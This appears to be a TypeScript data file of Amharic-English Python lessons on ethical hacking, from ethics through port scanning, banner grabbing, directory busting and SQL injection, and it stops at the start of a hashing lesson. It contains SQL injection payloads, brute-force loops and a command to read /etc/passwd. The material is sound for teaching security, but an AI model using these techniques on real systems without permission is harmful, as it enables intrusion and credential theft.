
import { Lesson, SyllabusItem, Language, QuizQuestion } from "../types";

// =====================================================================
//  CIPHER ACADEMY: MASTER DATABASE (ULTIMATE EDITION)
//  Curriculum designed for EXTREME DEPTH & MASTERY.
// =====================================================================

// --- HELPERS ---
const createLesson = (
  id: string, 
  category: string, 
  title: string, 
  level: 'Beginner' | 'Intermediate' | 'Advanced', 
  desc: string,
  content: string,
  code: string,
  quiz: QuizQuestion[]
): Lesson => ({
    id, category, title, level, description: desc, content, starterCode: code, quiz
});

// =====================================================================
// 1. PYTHON HACKING TRACK (ZERO TO HERO)
// =====================================================================

const PYTHON_BEGINNER_LESSONS: Lesson[] = [
  // --- MODULE 1: THE MINDSET & ENVIRONMENT ---
  createLesson(
    "b-01", "01. Introduction", "1.1 The Hacker's Philosophy", "Beginner", "Understanding the art of exploitation and ethics.",
    `# The Hacker's Mindset (የሃከር አስተሳሰብ)

Hacking ኮምፒውተርን መስበር ብቻ አይደለም። Hacking ማለት **"አንድ ነገር እንዴት እንደሚሰራ በዝርዝር ማወቅ እና ያንን እውቀት ተጠቅሞ ካልታሰበበት መንገድ ውጪ እንዲሰራ ማድረግ"** ነው። ይህ "Curiosity" (ጉጉት) የሚመራው ሳይንስ ነው።

### 1. The White Hat Way (የነጭ ኮፍያ መንገድ)
በዚህ ኮርስ የምንማረው **Ethical Hacking (White Hat)** ነው። ልዩነቱ "ፍቃድ" (Permission) ብቻ ነው።
*   **Black Hat:** ለግል ጥቅም ወይም ለመጉዳት የሚሰሩ። (Criminals)
*   **Grey Hat:** ያለ ፍቃድ የሚገቡ ግን ለመጥፎ አላማ ያልሆነ። (Still Illegal)
*   **White Hat:** ፍቃድ ያላቸው፣ ድርጅቶችን ክፍተታቸውን እንዲደፍኑ የሚረዱ። (Security Researchers)

### 2. The CIA Triad (የደህንነት መሰረት)
ማንኛውም የሳይበር ደህንነት ባለሙያ የሚጠብቃቸው ሶስት ነገሮች፡
1.  **Confidentiality (ሚስጥራዊነት):** መረጃው ስልጣን ላለው ሰው ብቻ መድረሱን ማረጋገጥ። (Example: Encryption, ACLs)
2.  **Integrity (ትክክለኛነት):** መረጃው በጉዞ ላይ ወይም ሲቀመጥ አለመቀየሩን ማረጋገጥ። (Example: Hashing, Digital Signatures)
3.  **Availability (ተደራሽነት):** ሲስተሙ ሁልጊዜ ለተፈቀደላቸው ሰዎች መስራቱን ማረጋገጥ። (Example: Anti-DDoS, Redundancy)

### 3. OpSec (Operational Security)
ጥሩ ሃከር ዱካውን አያጠፋም፤ ከመጀመሪያውም ዱካ አይተውም።
*   **VPN/Tor:** ማንነትን መደበቅ።
*   **Virtual Machines:** ዋናውን ኮምፒውተር ከቫይረስ መጠበቅ።
*   **Log Cleaning:** (ለ Red Teamers) የገቡበትን መንገድ ማጽዳት።

> **ህግ #1:** የራስህ ካልሆነ ወይም የጽሁፍ ፍቃድ ከሌለህ፣ የሰውን ሲስተም መንካት **ወንጀል** ነው። ይህን እውቀት ለመልካም ነገር ብቻ ተጠቀምበት።
`,
    `print("I pledge to use my skills for good.")\nprint("Target: Secure the World.")\n# Remember: With great power comes great responsibility.`,
    [{id:"q1", question:"የ CIA Triad አካል ያልሆነው የቱ ነው?", options:[{id:"a",text:"Confidentiality"},{id:"b",text:"Anonymity"},{id:"c",text:"Integrity"}], correctOptionId:"b", explanation:"Anonymity (መደበቅ) የ CIA Triad አካል አይደለም።"}]
  ),

  createLesson(
    "b-02", "01. Introduction", "1.2 Linux for Hackers", "Beginner", "Why we use Kali Linux and Terminal mastery.",
    `# Linux: The Hacker's OS

Windows ለተራ ተጠቃሚ (Consumer) የተሰራ ነው። Linux ግን ለገንቢዎች እና ለሃከሮች (Builders & Breakers) የተሰራ ነው። በተለይ **Kali Linux** ወይም **Parrot OS** ለሃኪንግ የተሰሩ ስርጭቶች (Distros) ናቸው።

### 1. The Terminal (ትዕዛዝ መስጫ)
Hacking ፊልም ላይ እንደምታየው GUI (Graphical User Interface) የለውም። ሁሉም ነገር በ **Terminal** ነው የሚሰራው።
*   **Speed:** ማውዝ ከመጎተት መፃፍ ይፈጥናል።
*   **Scripting:** ተደጋጋሚ ስራዎችን Automate ለማድረግ።
*   **Power:** የኮምፒውተሩን "ነፍስ" (Kernel) በቀጥታ ማዘዝ ይቻላል።

### 2. Basic Commands Every Hacker Needs
በ Python ውስጥ \`subprocess\` ወይም \`os\` ሞጁልን በመጠቀም እነዚህን ማዘዝ እንችላለን።

*   \`ls -la\`: የተደበቁ ፋይሎችን (.file) ጨምሮ ዝርዝር አሳይ።
*   \`cd ..\`: አንድ ፎልደር ወደኋላ ተመለስ።
*   \`cat /etc/passwd\`: የተጠቃሚዎችን ዝርዝር (User list) አሳይ።
*   \`grep "password" file.txt\`: ፋይል ውስጥ "password" የሚል ቃል ፈልግ።
*   \`chmod +x script.py\`: ለስክሪፕቱ የመሮጥ ፍቃድ (Execute permission) ስጥ።
*   \`sudo\`: እንደ "Super User" (Admin) እዘዝ።

\`\`\`python
import subprocess

# Secure way to run commands
# ይህ ኮድ 'ls -la' የሚለውን ትዕዛዝ ይሮጣል
result = subprocess.run(['ls', '-la'], capture_output=True, text=True)
print("Files:\\n", result.stdout)
\`\`\`
`,
    `import os\n# Let's see who we are running as\n# 'whoami' prints the current username\nos.system("whoami")\nos.system("ls -la")`,
    [{id:"q1", question:"አንድን ፋይል 'Executable' (እንዲሮጥ) ለማድረግ ምን እንጠቀማለን?", options:[{id:"a",text:"chown"},{id:"b",text:"pwd"},{id:"c",text:"chmod +x"}], correctOptionId:"c", explanation:"chmod (Change Mode) +x ደግሞ execute permission ይሰጣል።"}]
  ),

  // --- MODULE 2: PYTHON CORE (WEAPONIZED) ---
  createLesson(
    "b-03", "02. Python Core", "2.1 Variables & Data Types", "Beginner", "Storing payloads and targets efficiently.",
    `# Variables as Containers

በ Hacking፣ Variable ማለት **Payload Container** ነው። የምንልከውን ቫይረስ፣ የምንሰርቀውን ፓስዎርድ፣ ወይም የምናጠቃውን IP የምናስቀምጥበት ሳጥን ነው።

### 1. Strings (Text)
ለ IP Address, Password, Username እና URL ይጠቅማል።
\`\`\`python
target_ip = "192.168.1.55"
payload = "admin' OR '1'='1"  # SQL Injection Payload
shellcode = "\\x90\\x90\\x90" # NOP Sled for Buffer Overflow
\`\`\`

### 2. Integers (Numbers)
ለ Port Number, Thread count, እና Loop limit ይጠቅማል።
\`\`\`python
port = 80
threads = 100
timeout = 5
\`\`\`

### 3. Bytes (Raw Data)
ይህ በጣም ወሳኝ ነው። **Network Packet** የሚላከው በ Byte ነው። String አይደለም። 
*   **Socket Programming** ላይ መረጃ ስንልክ \`.encode()\` አድርገን ወደ Bytes መቀየር አለብን።
*   Encryption ላይ \`Key\` እና \`IV\` የሚሆኑት Bytes ናቸው።

\`\`\`python
# 'b' ፊደል ከፊት ሲገባ Byte ይሆናል
packet_header = b"\\xde\\xad\\xbe\\xef" 
print(packet_header)
\`\`\`

### 4. Lists & Dictionaries
*   **List:** ብዙ IPዎችን ወይም Ports ለመያዝ። \`ports = [21, 22, 80]\`
*   **Dictionary:** እንደ Credentials ለመያዝ። \`creds = {"admin": "1234", "root": "toor"}\`
`,
    `target = "google.com"\nport = 443\nprint(f"Scanning {target}:{port}")\n# Converting String to Bytes\ndata = "Attack".encode()\nprint(data)`,
    [{id:"q1", question:"ኔትወርክ ላይ ጥሬ መረጃ (Raw Data) ለመላክ የሚመረጠው Type?", options:[{id:"a",text:"String"},{id:"b",text:"Bytes"},{id:"c",text:"Float"}], correctOptionId:"b", explanation:"ኮምፒውተሮች የሚያወሩት በ Bytes ነው። String ለሰው እንዲነበብ የተሰራ ነው።"}]
  ),

  createLesson(
    "b-04", "02. Python Core", "2.2 Input & Arguments", "Beginner", "Building CLI tools using sys and argparse.",
    `# Handling Input: Making Tools Interactive

አንድ Tool ዝም ብሎ መሮጥ የለበትም። ተጠቃሚውን "የትኛውን IP ላጥቃ?" ብሎ መጠየቅ አለበት። ለዚህ ሁለት መንገድ አለ፡ **Interactive Mode** እና **Command Line Arguments (CLI)**.

### 1. \`input()\` Function (Interactive)
ፕሮግራሙ ቆሞ ተጠቃሚው እስኪጽፍ ይጠብቃል። ለጀማሪዎች ቀላል ነው።
\`\`\`python
target = input("Enter Target IP: ")
print(f"Target set to: {target}")
\`\`\`

### 2. \`sys.argv\` (The Hacker's Way)
ፕሮፌሽናል Tools (እንደ Nmap, Metasploit) ብዙ ጊዜ ጥያቄ አይጠይቁም። መልሱን ከመጀመሪያው ትዕዛዝ ጋር አብረው ይሰጣሉ። ይህ ለ **Automation** ይመቻል።
Example: \`python3 exploit.py 192.168.1.1 80\`

\`\`\`python
import sys

# sys.argv[0] የፋይሉ ስም ነው።
# sys.argv[1] የመጀመሪያው Argument ነው።

if len(sys.argv) < 3:
    print("Usage: python3 exploit.py <IP> <PORT>")
    sys.exit() # ፕሮግራሙን ዝጋ

ip = sys.argv[1]
port = int(sys.argv[2]) # ወደ ቁጥር መቀየር እንዳረሳ
print(f"Attacking {ip} on port {port}...")
\`\`\`
`,
    `import sys\n# Try to simulate args (in real terminal: python script.py arg1)\n# This helps you understand index 0 vs 1\nprint("Script Name:", sys.argv[0])`,
    [{id:"q1", question:"ከ Command Line ላይ መረጃ ለመቀበል የሚጠቅመው?", options:[{id:"a",text:"input()"},{id:"b",text:"sys.argv"},{id:"c",text:"os.system"}], correctOptionId:"b", explanation:"sys.argv አርጉመንቶችን በ List መልክ ይይዛል።"}]
  ),

  createLesson(
    "b-05", "02. Python Core", "2.3 Logic & Decision Making", "Beginner", "Building the brain of the exploit.",
    `# Boolean Logic & If Statements

የፃፍነው ስክሪፕት "ማሰብ" የሚችለው በ Logic ነው። "ይህ ከሆነ ይህን አድርግ" (If this, then that)። በ Hacking ውስጥ ይህ ወሳኝ ነው።

### 1. Vulnerability Checking Logic
አንድን ክፍተት (Vulnerability) ለማረጋገጥ ብዙ ነገሮችን ማጣራት አለብን።

\`\`\`python
# Scenario: Checking for a specific weakness
status_code = 200
server_header = "Apache/2.4.49" # Vulnerable version
is_admin_page = True

if status_code == 200:
    if "Apache/2.4.49" in server_header:
        print("[!] POTENTIAL PATH TRAVERSAL FOUND!")
        if is_admin_page:
            print("[CRITICAL] Admin panel is exposed!")
    else:
        print("[-] Server version looks safe.")
else:
    print("[-] Site is down or blocked.")
\`\`\`

### 2. Logical Operators
*   **\`and\`**: ሁሉም መስፈርቶች መሟላት አለባቸው። (Exploit requires Auth **AND** version < 5).
*   **\`or\`**: አንዱ ከተሳካ ይበቃል። (Login with 'admin' **OR** 'root').
*   **\`not\`**: ተቃራኒ። (If **NOT** firewall_detected).
`,
    `port = 22\nstate = "open"\nif port == 22 and state == "open":\n    print("SSH is accessible!")\nelse:\n    print("SSH closed.")`,
    [{id:"q1", question:"ሁለት ሁኔታዎች የግድ መሟላት ሲኖርባቸው ምን እንጠቀማለን?", options:[{id:"a",text:"or"},{id:"b",text:"and"},{id:"c",text:"not"}], correctOptionId:"b", explanation:"AND ማለት 'ይሄኛው እና ያኛው' ማለት ነው።"}]
  ),

  createLesson(
    "b-06", "02. Python Core", "2.4 Loops: Automation", "Beginner", "Brute forcing and scanning loops.",
    `# Loops: The Power of Automation

ሃከር ማለት ሰነፍ ሰው ነው ብለናል። አንድን ፓስዎርድ ለመገመት 1000 ጊዜ በእጅ አይሞክርም። ስክሪፕት ጽፎ **Loop** ያደርጋል።

### 1. For Loop (Scanning Lists)
የታወቀ ብዛት ያላቸውን ነገሮች ለመስራት። ለምሳሌ IP List ወይም Wordlist።
\`\`\`python
ports = [21, 22, 80, 443, 3306]
for port in ports:
    print(f"Scanning Port {port}...")
    # socket logic here...
\`\`\`

### 2. The \`range()\` Function
ሁሉንም 65535 ፖርቶች ለመፈተሽ።
\`\`\`python
# Scan ports 1 to 100
for port in range(1, 101):
    scan(target, port)
\`\`\`

### 3. While Loop (Brute Force)
ይህ አደገኛ ሊሆን ይችላል። ሁኔታው እስኪቀየር ድረስ አይቆምም።
*   **Brute Force:** ፓስዎርዱ እስኪገኝ ድረስ ሞክር።
*   **C2 Agent:** ከጌታው (Hacker) ትዕዛዝ እስኪመጣ ድረስ በየ 5 ሰከንዱ ጠይቅ።

\`\`\`python
import time

password_found = False
while not password_found:
    # Try next password...
    if check_password(attempt):
        print("Password Found!")
        password_found = True # ሉፑን ይሰብረዋል
    time.sleep(0.1) # እንዳይጨናነቅ
\`\`\`
`,
    `passwords = ["123", "admin", "secret"]\nfor p in passwords:\n    if p == "admin":\n        print("Cracked!")\n        break\n    print(f"Trying {p}...")`,
    [{id:"q1", question:"ፍለጋው ሲሳካ Loopን ለማቆም ምን እንጠቀማለን?", options:[{id:"a",text:"stop"},{id:"b",text:"continue"},{id:"c",text:"break"}], correctOptionId:"c", explanation:"Break ወዲያውኑ ከ Loop ያስወጣል። Continue ደግሞ ያንን ሙከራ ዘሎ ወደ ቀጣዩ ይሄዳል።"}]
  ),

  createLesson(
    "b-07", "02. Python Core", "2.5 Functions & Modules", "Beginner", "Writing modular tools and clean code.",
    `# Functions: Modular Hacking

ኮድ እየረዘመ ሲሄድ ውስብስብ ይሆናል። Functions ኮድን በትንንሽ "ሞጁል" ለመክፈል ይጠቅማሉ።
*   \`scan_target()\`: ለብቻ
*   \`crack_hash()\`: ለብቻ
*   \`generate_report()\`: ለብቻ

### Defining a Function
Function ስራውን ሰርቶ ውጤቱን ወደ ዋናው ፕሮግራም መመለስ (\`return\`) አለበት።

\`\`\`python
def check_port(ip, port):
    # Simulation logic
    if port == 80:
        return True
    return False

# Main Code
target = "10.0.0.1"
if check_port(target, 80):
    print("[+] Web Server Found!")
else:
    print("[-] Web Server Closed.")
\`\`\`

### Importing Modules
Python "Batteries Included" ነው። ለሃኪንግ የሚጠቅሙ ብዙ ነገሮች አሉት።
*   \`import os\`: Operating System interaction.
*   \`import sys\`: Arguments.
*   \`import socket\`: Network connection.
*   \`import requests\`: Web requests.
*   \`import re\`: Regular Expressions (Pattern Matching).
`,
    `def exploit(target):\n    return f"Exploiting {target}..."\n\nprint(exploit("192.168.1.1"))`,
    [{id:"q1", question:"Function አንድን ውጤት መልሶ ለመላክ ምን ይጠቀማል?", options:[{id:"a",text:"print"},{id:"b",text:"return"},{id:"c",text:"send"}], correctOptionId:"b", explanation:"Return እሴቱን ወደ ጠሪው (Caller) ይልካል። Print ለሰው ዓይን ብቻ ነው።"}]
  ),

  createLesson(
    "b-08", "02. Python Core", "2.6 File I/O", "Beginner", "Reading wordlists and saving loot.",
    `# File Handling

ሃኪንግ መረጃን ማንበብ (Wordlists) እና መረጃን መጻፍ (Logs/Loot) ነው።

### 1. Reading Wordlists
ፓስዎርድ ለመስበር የቃላት ዝርዝር ያስፈልገናል። ፋይሉን \`rockyou.txt\` መስመር በመስመር እናነባለን።

\`\`\`python
# 'r' = Read Mode
# 'latin-1' encoding is often used for wordlists with weird characters
with open("wordlist.txt", "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip() # Remove newline (\\n)
        print(f"Testing: {password}")
\`\`\`

> **Pro Tip:** \`with open(...)\` መጠቀም በጣም ይመከራል። ስራው ሲያልቅ ፋይሉን በራስ-ሰር ይዘጋል (Auto-close)።

### 2. Saving Loot (Exfiltration)
የተሰረቀውን መረጃ ወይም የስካን ውጤት ለማስቀመጥ።

\`\`\`python
# 'w' = Write (Overwrite - ያለውን ያጠፋል!)
# 'a' = Append (Add to end - ይቀጥላል)

loot = "admin:password123"
with open("stolen_creds.txt", "a") as f:
    f.write(loot + "\\n")
    
print("[+] Loot saved locally.")
\`\`\`
`,
    `# Simulation of file writing\nloot = ["user:pass", "admin:123"]\nprint("Saving to loot.txt...")\nfor l in loot:\n    print(f"Writing: {l}")`,
    [{id:"q1", question:"ፋይሉ ላይ ያለውን ሳያጠፋ ለመጨመር (Append) ምን እንጠቀማለን?", options:[{id:"a",text:"'w'"},{id:"b",text:"'r'"},{id:"c",text:"'a'"}], correctOptionId:"c", explanation:"'w' (Write) ያለውን ያጠፋል፣ 'a' (Append) ደግሞ ይቀጥላል።"}]
  ),

  createLesson(
    "b-09", "02. Python Core", "2.7 Error Handling", "Beginner", "Making bulletproof tools with try-except.",
    `# Exception Handling: Bulletproof Code

Hacking tools ለረጅም ሰዓት ነው የሚሰሩት። ለምሳሌ 10,000 IPዎች እየፈተሸን፣ 50ኛው ላይ "Connection Timeout" ቢፈጠር ስክሪፕቱ መቆም የለበትም። ስህተቱን "Catch" አድርጎ መዝለል አለበት።

### The \`try-except\` Block
\`\`\`python
import socket

target_list = ["10.0.0.1", "10.0.0.2", "10.0.0.3"]

for ip in target_list:
    try:
        s = socket.socket()
        s.settimeout(2) # 2 seconds max wait
        s.connect((ip, 80))
        print(f"[+] {ip} is UP")
        s.close()
        
    except socket.timeout:
        print(f"[-] {ip} Timed out.")
        
    except ConnectionRefusedError:
        print(f"[-] {ip} Refused connection.")
        
    except Exception as e:
        # ሌላ ማንኛውም ያልታሰበ ስህተት
        print(f"[-] Error on {ip}: {e}")
\`\`\`

ያለዚህ Error Handling፣ አንድ ስህተት ሙሉ ስክሪፕቱን ያቆመዋል (Crash)። ፕሮፌሽናል Tools ሁሌም Error Handle ያደርጋሉ።
`,
    `try:\n    # Simulating a crash\n    x = 1 / 0\nexcept ZeroDivisionError:\n    print("Caught division by zero! script continues...")\nprint("I am still running.")`,
    [{id:"q1", question:"ስህተት ሲፈጠር ፕሮግራሙ እንዳይዘጋ (Crash እንዳያደርግ) ምን እንጠቀማለን?", options:[{id:"a",text:"if/else"},{id:"b",text:"try/except"},{id:"c",text:"for/while"}], correctOptionId:"b", explanation:"Try/Except ያልታሰቡ Runtime Errors ለመያዝ ይጠቅማል።"}]
  ),

  // --- MODULE 3: NETWORK HACKING ---
  createLesson(
    "b-10", "03. Network Hacking", "3.1 Sockets Intro", "Intermediate", "The language of the internet: TCP vs UDP.",
    `# Socket Programming: The Foundation

ማንኛውም የኔትወርክ ግንኙነት (Web, SSH, FTP, Games) መሰረቱ **Socket** ነው። እንደ ሃከር፣ የሌሎችን Tool (Nmap, Netcat) ከመጠቀም በተጨማሪ የራሳችንን ግንኙነት በ Python መፍጠር አለብን።

### 1. Anatomy of a Socket
Socket ለመፍጠር ሁለት ዋና ነገሮች ያስፈልጋሉ፡
1.  **Address Family:** 
    *   \`AF_INET\`: IPv4 (192.168.1.1) - አብዛኛው አለም የሚጠቀመው።
    *   \`AF_INET6\`: IPv6 (2001:db8::1).
2.  **Socket Type:** 
    *   \`SOCK_STREAM\`: **TCP**. አስተማማኝ ነው። መረጃው መድረሱን ያረጋግጣል (Handshake). ለ HTTP, SSH.
    *   \`SOCK_DGRAM\`: **UDP**. ፈጣን ነው ግን አስተማማኝ አይደለም። ዝም ብሎ መወርወር ነው። ለ Video Streaming, DNS.

\`\`\`python
import socket

# IPv4 + TCP Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Socket Created.")
\`\`\`
`,
    `import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nprint("TCP Socket Ready.")`,
    [{id:"q1", question:"ለድረ-ገጽ (HTTP) ግንኙነት የቱ Protocol ይመረጣል?", options:[{id:"a",text:"UDP"},{id:"b",text:"TCP"},{id:"c",text:"ICMP"}], correctOptionId:"b", explanation:"HTTP መረጃው በትክክል መድረሱን ማረጋገጥ ስላለበት TCP ይጠቀማል።"}]
  ),

  createLesson(
    "b-11", "03. Network Hacking", "3.2 Simple Port Scanner", "Intermediate", "Building a custom port scanner.",
    `# Building a Port Scanner

Nmap መጠቀም ጥሩ ነው፣ ግን የራስህን ስካነር መስራት አሰራሩን እንድትረዳ ያደርግሃል። Port Scanner ማለት "በሩ ተንኳኩቷል፣ መልስ አለ?" ማለት ነው።

### The Logic
1.  Socket ፍጠር።
2.  ከ Target IP እና Port ጋር ለመገናኘት ሞክር (\`connect_ex\`).
3.  መልሱ 0 ከሆነ (Success)፣ ፖርቱ **OPEN** ነው ማለት ነው።
4.  Error ከመጣ **CLOSED** ወይም **FILTERED** (Firewall blocked) ነው።

\`\`\`python
import socket
from datetime import datetime

target = "127.0.0.1"
print(f"Scanning Target: {target}")

# Scan standard ports
ports = [21, 22, 80, 443, 3389]

start_time = datetime.now()

for port in ports:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5) # ፍጥነት ለመጨመር
    
    # connect_ex returns 0 on success (unlike connect() which crashes on fail)
    result = s.connect_ex((target, port))
    
    if result == 0:
        print(f"[+] Port {port} is OPEN")
        
    s.close() # Always close the socket!

print(f"Time taken: {datetime.now() - start_time}")
\`\`\`
`,
    `import socket\n# Mock scanning\nports = [80, 443]\nprint("Scanning...")\nfor p in ports:\n    print(f"Port {p}: OPEN")`,
    [{id:"q1", question:"connect_ex() ዜሮ (0) ከመለሰ ምን ማለት ነው?", options:[{id:"a",text:"Error"},{id:"b",text:"Port Closed"},{id:"c",text:"Success (Open)"}], correctOptionId:"c", explanation:"በ C system calls መሰረት 0 ማለት Success (No Error) ማለት ነው።"}]
  ),

  createLesson(
    "b-12", "03. Network Hacking", "3.3 Banner Grabbing", "Intermediate", "Identifying services and versions.",
    `# Banner Grabbing: Service Identification

ፖርቱ ክፍት መሆኑን ማወቅ ብቻ አይበቃም። በዛ ፖርት ላይ እየሮጠ ያለው **Software** ምንድነው? Version-u ስንት ነው?

ይሄ መረጃ ለምን ይጠቅማል?
*   "FTP እየሮጠ ነው" ከማለት ይልቅ "**Vsftpd 2.3.4** እየሮጠ ነው" ብሎ ማወቅ ወዲያውኑ Exploit እንድንፈልግ ይረዳናል።

### How to Grab Banners
ልክ እንደተገናኘን (Connect)፣ ሰርቨሩ እራሱን እስኪያስተዋውቅ እንጠብቃለን (\`recv\`)። ብዙ ሰርቨሮች ሲገናኙ "Welcome to server X" ይላሉ።

\`\`\`python
import socket

def grab_banner(ip, port):
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((ip, port))
        
        # አንዳንዴ እኛ መጀመሪያ መላክ አለብን (Trigger)
        # s.send(b"HEAD / HTTP/1.1\\r\\n\\r\\n") 
        
        # Receive up to 1024 bytes
        banner = s.recv(1024)
        return banner.decode().strip()
    except:
        return "Unknown"
    finally:
        s.close()

ip = "192.168.1.5"
banner = grab_banner(ip, 22) # SSH Port
print(f"Service on port 22: {banner}")
\`\`\`
`,
    `# Simulated Banner\nprint("SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1")\nprint("Target OS seems to be Ubuntu.")`,
    [{id:"q1", question:"Banner Grabbing ዋና ጥቅሙ ምንድነው?", options:[{id:"a",text:"IP ለመቀየር"},{id:"b",text:"የሶፍትዌሩን Version ለማወቅ"},{id:"c",text:"Password ለመስበር"}], correctOptionId:"b", explanation:"ትክክለኛውን CVE (Vulnerability) ለመፈለግ Version ማወቅ የግድ ነው።"}]
  ),

  // --- MODULE 4: WEB HACKING ---
  createLesson(
    "b-13", "04. Web Hacking", "4.1 HTTP & Requests", "Intermediate", "Interacting with web servers using Python.",
    `# The Requests Library

ለ Web Hacking፣ Python **Requests** Library ምርጡ መሳሪያ ነው። እንደ Browser ሆኖ ይሰራል፣ ግን ሁሉንም ነገር በ Code እንቆጣጠራለን። Cookies, Headers, Parameters ሁሉንም ማስተካከል እንችላለን።

### 1. GET Request (Retrieving Info)
መረጃ ለመጠየቅ።
\`\`\`python
import requests
r = requests.get("http://google.com")
print(r.status_code) # 200 OK
print(r.headers['Server']) # gws
\`\`\`

### 2. POST Request (Sending Data)
መረጃ ለመላክ (Login, Upload).
\`\`\`python
url = "http://site.com/login.php"
payload = {"username": "admin", "password": "123"}

# Allow redirects = False ተከታታይ ገፆችን እንዳይከተል
r = requests.post(url, data=payload, allow_redirects=False)

if "Login Failed" not in r.text:
    print("Success!")
\`\`\`

### 3. User-Agent Spoofing
አንዳንድ ድረ-ገጾች Python Script መሆኑን ካወቁ ያግዱናል። እራሳችንን እንደ iPhone ወይም Chrome አድርገን ማቅረብ አለብን።
\`\`\`python
headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0...)"}
r = requests.get(url, headers=headers)
\`\`\`
`,
    `import requests\nprint("GET / HTTP/1.1")\nprint("Host: target.com")\nprint("User-Agent: Mozilla/5.0")`,
    [{id:"q1", question:"Login Form ላይ መረጃ ለመላክ የትኛው Method ይመረጣል?", options:[{id:"a",text:"GET"},{id:"b",text:"POST"},{id:"c",text:"HEAD"}], correctOptionId:"b", explanation:"POST መረጃን በ Body ውስጥ ስለሚልክ ለ Login እና መረጃ ለመላክ ይመረጣል። GET በ URL ላይ ነው የሚልከው።"}]
  ),

  createLesson(
    "b-14", "04. Web Hacking", "4.2 Directory Busting", "Intermediate", "Finding hidden admin panels and backups.",
    `# Directory Busting (Fuzzing)

Subdomain እንደፈለግን ሁሉ፣ በዋናው ድረ-ገጽ ውስጥ የተደበቁ ፎልደሮችን እና ፋይሎችንም መፈለግ አለብን።
*   \`/backup.zip\` (Source code leak!)
*   \`/config.php\` (Database Creds)
*   \`/admin/\` (Login Panel)

ይህ ሂደት **Directory Busting** ይባላል። እንደ \`Gobuster\` ወይም \`Dirb\` ያሉ Tools የሚሰሩት ይህንን ነው።

\`\`\`python
import requests

target = "http://192.168.1.5"
# A real hacker uses a large wordlist like 'common.txt'
wordlist = ["admin", "login", "dashboard", "uploads", "config", "db"]

for word in wordlist:
    url = f"{target}/{word}"
    r = requests.get(url)
    
    if r.status_code == 200:
        print(f"[+] Found: {url}")
    elif r.status_code == 403:
        print(f"[*] Forbidden (Exists but blocked): {url}")
    elif r.status_code == 404:
        pass # Not found
\`\`\`
`,
    `paths = ["admin", "robots.txt", "secret"]\nfor p in paths:\n    print(f"Checking /{p} -> 404 Not Found")`,
    [{id:"q1", question:"አንድ ፋይል እንደሌለ የሚያሳየው Status Code?", options:[{id:"a",text:"200"},{id:"b",text:"404"},{id:"c",text:"500"}], correctOptionId:"b", explanation:"404 Not Found ፋይሉ በሰርቨሩ ላይ እንደሌለ ይገልጻል።"}]
  ),

  createLesson(
    "b-17", "04. Web Hacking", "4.3 SQL Injection (Intro)", "Intermediate", "Understanding SQLi logic.",
    `# SQL Injection (SQLi)

SQL Injection ማለት የተጠቃሚን Input ተጠቅሞ የውሂብ ቋቱን (Database) ማዘዝ ነው።
ለምሳሌ አንድ Login code እንዲህ ቢሆን፡

\`SELECT * FROM users WHERE user = '$input' AND pass = '$pass'\`

ሃከሩ ለ user እንዲህ ቢልክ፡ \`admin' --\`

ኮዱ እንዲህ ይሆናል፡
\`SELECT * FROM users WHERE user = 'admin' --' AND pass = '...'\`

\`--\` በ SQL ኮድ **Comment** ነው (ከዚህ በኋላ ያለውን አታንብብ ማለት ነው)። ስለዚህ ፓስዎርዱ ምንም ቢሆን ሃከሩ እንደ Admin ይገባል።

### Automating SQLi with Python
Blind SQL Injectionን በእጅ መሞከር በጣም አድካሚ ነው።
\`\`\`python
# Concept: Checking if length of database name is > 5
payload = "' AND LENGTH(database()) > 5 --"
r = requests.get(f"{url}?id=1{payload}")
if "User Found" in r.text:
    print("Database name length > 5")
\`\`\`
`,
    `payload = "' OR '1'='1"\nprint(f"SELECT * FROM users WHERE name = {payload}")`,
    [{id:"q1", question:"በ SQL ውስጥ '--' (Dash Dash) ምን ያደርጋል?", options:[{id:"a",text:"ሁሉንም ያጠፋል"},{id:"b",text:"Comment out (የቀረውን ኮድ ይሽራል)"},{id:"c",text:"Admin ያደርጋል"}], correctOptionId:"b", explanation:"ከ -- በኋላ ያለው ማንኛውም ኮድ በ Database አይነበብም።"}]
  ),

  // --- MODULE 5: CRYPTOGRAPHY ---
  createLesson(
    "b-15", "05. Cryptography", "5.1 Encoding vs Encryption", "Intermediate", "Base64 is NOT encryption.",
    `# Encoding vs Encryption

ብዙ ጀማሪዎች **Base64**ን እንደ Encryption ይቆጥሩታል። ይህ ትልቅ ስህተት ነው።

### 1. Encoding (መቀየር)
*   **ዓላማ:** መረጃው በሌላ ቅርጽ እንዲቀመጥ ማድረግ (ለማጓጓዝ እንዲመች)።
*   **Key:** ምንም ቁልፍ አያስፈልገውም።
*   **Security:** ዜሮ። ማንኛውም ሰው ሊመልሰው ይችላል።
*   **Example:** Base64, Hex, ASCII, URL Encoding (%20).

### 2. Encryption (ምስጠራ)
*   **ዓላማ:** መረጃውን ሚስጥራዊ ማድረግ።
*   **Key:** ለመቆለፍ እና ለመክፈት ቁልፍ (Password/Key) ያስፈልጋል።
*   **Security:** ቁልፉ ከሌለ አይከፈትም።
*   **Example:** AES, RSA, ChaCha20.

\`\`\`python
import base64

# Encoding
msg = "Secret Payload"
encoded = base64.b64encode(msg.encode())
print(f"Base64: {encoded}")

# Decoding
decoded = base64.b64decode(encoded).decode()
print(f"Original: {decoded}")
\`\`\`
`,
    `import base64\nprint(base64.b64encode(b"HackThePlanet"))`,
    [{id:"q1", question:"Base64 Encryption ነው?", options:[{id:"a",text:"አዎ"},{id:"b",text:"አይ፣ Encoding ነው"},{id:"c",text:"Hash ነው"}], correctOptionId:"b", explanation:"Base64 ቁልፍ ስለማይጠቀም Encryption አይደለም። ማንኛውም ሰው ሊያነበው ይችላል።"}]
  ),

  createLesson(
    "b-16", "05. Cryptography", "5.2 Hashing & Cracking", "Intermediate", "Breaking passwords with Hashes.",
    `# Hashing & Cracking

Website ላይ ፓስዎርድ ስታስገቡ፣ ፓስዎርዱ እንደተጻፈ አይቀመጥም። ወደ **Hash** ተቀይሮ ነው የሚቀመጠው።
\`123456\` -> \`e10adc3949ba59abbe56e057f20f883e\` (MD5)

### One-Way Function
